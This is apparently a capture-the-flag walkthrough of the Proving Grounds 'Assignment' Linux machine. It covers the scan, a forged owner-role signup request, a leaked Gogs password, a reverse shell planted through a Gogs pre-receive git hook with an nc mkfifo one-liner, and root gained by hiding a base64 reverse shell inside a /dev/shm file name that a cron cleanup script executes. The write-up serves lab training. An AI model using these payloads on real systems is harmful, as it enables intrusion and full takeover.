---
layout: default
title: Assignment
parent: Proving Grounds Practice - Linux
nav_order: 19
---

# Scanning

---

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/linux/assignment]
└─$ sudo nmap -Pn -p- -sC -sV --open 192.168.198.224
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-25 22:05 EST
Nmap scan report for 192.168.198.224
Host is up (0.058s latency).
Not shown: 65045 closed tcp ports (reset), 487 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 62:36:1a:5c:d3:e3:7b:e1:70:f8:a3:b3:1c:4c:24:38 (RSA)
|   256 ee:25:fc:23:66:05:c0:c1:ec:47:c6:bb:00:c7:4f:53 (ECDSA)
|_  256 83:5c:51:ac:32:e5:3a:21:7c:f6:c2:cd:93:68:58:d8 (ED25519)
80/tcp   open  http
|_http-title: notes.pg
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBi
ndReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessio
nReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, or
acle-tns:
|     HTTP/1.1 400 Bad Request
|   FourOhFourRequest, GetRequest, HTTPOptions:
|     HTTP/1.0 403 Forbidden
|     Content-Type: text/html; charset=UTF-8
|_    Content-Length: 0
8000/tcp open  http-alt
|_http-title: Gogs
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.0 404 Not Found
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
|     Set-Cookie: i_like_gogs=b3f4efbee7645197; Path=/; HttpOnly
|     Set-Cookie: _csrf=1TGpllSrOmNwcAzCTNPprJ18xEU6MTcwNjIzODM3NzAwNzU0ODExMw; Path=/; Domain=assignmen
t.pg; Expires=Sat, 27 Jan 2024 03:06:17 GMT; HttpOnly
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: DENY
|     Date: Fri, 26 Jan 2024 03:06:17 GMT
|     <!DOCTYPE html>
|     <html>
|     <head data-suburl="">
|     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
|     <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
|     <meta name="author" content="Gogs" />
|     <meta name="description" content="Gogs is a painless self-hosted Git service" />
|     <meta name="keywords" content="go, git, self-hosted, gogs">
|     <meta name="referrer" content="no-referrer" />
|     <meta name="_csrf" content="1TGpllSrOmNwcAzCTNPprJ18xEU6MTcwNjIzOD
|   GenericLines:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
|     Set-Cookie: i_like_gogs=b739c8e47a2d731b; Path=/; HttpOnly
|     Set-Cookie: _csrf=yfXohdLCc2L40dBU2nRzXE94i6k6MTcwNjIzODM3MTgwMTIwNzIzOA; Path=/; Domain=assignmen
t.pg; Expires=Sat, 27 Jan 2024 03:06:11 GMT; HttpOnly
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: DENY
|     Date: Fri, 26 Jan 2024 03:06:11 GMT
|     <!DOCTYPE html>
|     <html>
|     <head data-suburl="">
|     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
|     <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
|     <meta name="author" content="Gogs" />
|     <meta name="description" content="Gogs is a painless self-hosted Git service" />
|     <meta name="keywords" content="go, git, self-hosted, gogs">
|     <meta name="referrer" content="no-referrer" />
|_    <meta name="_csrf" content="yfXohdLCc2L40dBU2nRzXE94i6k6MTcwNjIzODM3MTgwM
|_http-open-proxy: Proxy might be redirecting requests
```

# Enumeration

---

## HTTP | 80

![notes_site](../../../assets/images/ctfs/proving_grounds/assignment/notes_site.png)

Located "jane@notes.pg" on home page.

Created user "kamino" and logged on.

![logged_on](../../../assets/images/ctfs/proving_grounds/assignment/logged_on.png)

Found the following "members"

```bsah

    jane
    tom
    jim
    judie
    james
    bob
    simon
    deezy
    authenticity_token=oPR93X4UzlLdlPeg_Aek9v3XDDJLLoL3hXS8pHLwzOPz8ER61j8nzjESjr4Tsq-_VGRhZBVCZ9TSr9VZqIe5YQ&user[username]=forged_owner&user[role]=owner&user[password]=forged_owner&user[password_confirmation]=forged_owner&button=
    deezy
    forged_owner
    kamino

```

The "forged_owner" credentials are displayed above.

Logging in as the "forged_owner" user we can view the /notes/1 path now that we have sufficient rights.

![note_1](../../../assets/images/ctfs/proving_grounds/assignment/note_1.png)

We have the creds for Jane of port 8000

jane:svc-dev2022@@@!;P;4SSw0Rd

## HTTP | 8000

Located Gogs running on port 8000

Login with the "jane" user credentials discovered above

Create a new repository and select settings.

![githooks](../../../assets/images/ctfs/proving_grounds/assignment/githooks.png)

Generate a reverse shell for "nc mkfifo"

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.45.245 9001 >/tmp/f
```

Place the reverse shell in the "pre-receive" Git Hooks setting

![revshell_hook](../../../assets/images/ctfs/proving_grounds/assignment/revshell_hook.png)

A reverse shell is obtained by cloning the repository, adding a README file, and the pushing a commit.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/linux/assignment]
└─$ touch README.md

┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/linux/assignment]
└─$ git init
hint: Using 'master' as the name for the initial branch. This default branch name
hint: is subject to change. To configure the initial branch name to use in all
hint: of your new repositories, which will suppress this warning, call:
hint:
hint:   git config --global init.defaultBranch <name>
hint:
hint: Names commonly chosen instead of 'master' are 'main', 'trunk' and
hint: 'development'. The just-created branch can be renamed via this command:
hint:
hint:   git branch -m <name>                                                                            Initialized empty Git repository in /home/vagrant/Documents/PG/PRACTICE/linux/assignment/.git/

┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/linux/assignment]
└─$ git add README.md

──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/linux/assignment]
└─$ git add README.md

┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/linux/assignment]
└─$ git commit -m "first commit"
[master (root-commit) d15c1d5] first commit
 Committer: vagrant <vagrant@kali.>
Your name and email address were configured automatically based
on your username and hostname. Please check that they are accurate.
You can suppress this message by setting them explicitly. Run the
following command and follow the instructions in your editor to edit
your configuration file:

    git config --global --edit

After doing this, you may fix the identity used for this commit with:

    git commit --amend --reset-author

 1 file changed, 0 insertions(+), 0 deletions(-)
 create mode 100644 README.md

┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/linux/assignment]
└─$ git remote add origin http://assignment.pg:8000/jane/test1.git

┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/linux/assignment]
└─$ git push -u origin master
Username for 'http://assignment.pg:8000': jane
Password for 'http://jane@assignment.pg:8000':
Enumerating objects: 3, done.
Counting objects: 100% (3/3), done.
Writing objects: 100% (3/3), 202 bytes | 202.00 KiB/s, done.
Total 3 (delta 0), reused 0 (delta 0), pack-reused 0
```

```bash
┌──(vagrant㉿kali)-[~/Documents/PG]
└─$ nc -nlvp 9001
listening on [any] 9001 ...
connect to [192.168.45.245] from (UNKNOWN) [192.168.198.224] 40296
sh: 0: can't access tty; job control turned off
$ id
uid=1000(jane) gid=1000(jane) groups=1000(jane)
$
```

![reverse](../../../assets/images/ctfs/proving_grounds/assignment/reverse.png)

# Privesc

## Check Running Processes

Upload pspy64 to target

```bash
ane@assignment:/tmp$ wget http://192.168.45.245:8000/pspy64
wget http://192.168.45.245:8000/pspy64
--2024-01-26 04:16:29--  http://192.168.45.245:8000/pspy64
Connecting to 192.168.45.245:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3104768 (3.0M) [application/octet-stream]
Saving to: ‘pspy64’

pspy64              100%[===================>]   2.96M  2.31MB/s    in 1.3s

2024-01-26 04:16:30 (2.31 MB/s) - ‘pspy64’ saved [3104768/3104768]

jane@assignment:/tmp$ chmod +x pspy64
chmod +x pspy64
jane@assignment:/tmp$ ./pspy64
./pspy64
```

![cron](../../../assets/images/ctfs/proving_grounds/assignment/cron.png)

Checking what /usr/bin/clean-tmp.sh does.

```bash
jane@assignment:/tmp$ cat /usr/bin/clean-tmp.sh
#! /bin/bash
find /dev/shm -type f -exec sh -c 'rm {}' \;

```

We just need to pass a base64 encoded command to a file in /dev/shm so the clean-tmp.sh will execute and create rootshell script that allows the current user to get elevated prvileges.

```bash
jane@assignment:/tmp$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.45.245 9002 >/tmp/f" | base64
cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnxzaCAtaSAyPiYxfG5jIDE5Mi4xNjguNDUuMjQ1IDkwMDIgPi90bXAvZgo=
jane@assignment:/tmp$ echo "" > /dev/shm/'$(echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnxzaCAtaSAyPiYxfG5jIDE5Mi4xNjguNDUuMjQ1IDkwMDIgPi90bXAvZgo= | base64 -d | bash)'


```

Once the cron job runs we get a reverse shell...

```bash
┌──(vagrant㉿kali)-[~/Documents/PG]
└─$ nc -nlvp 9002
listening on [any] 9002 ...
connect to [192.168.45.245] from (UNKNOWN) [192.168.198.224] 44600
sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
#

```
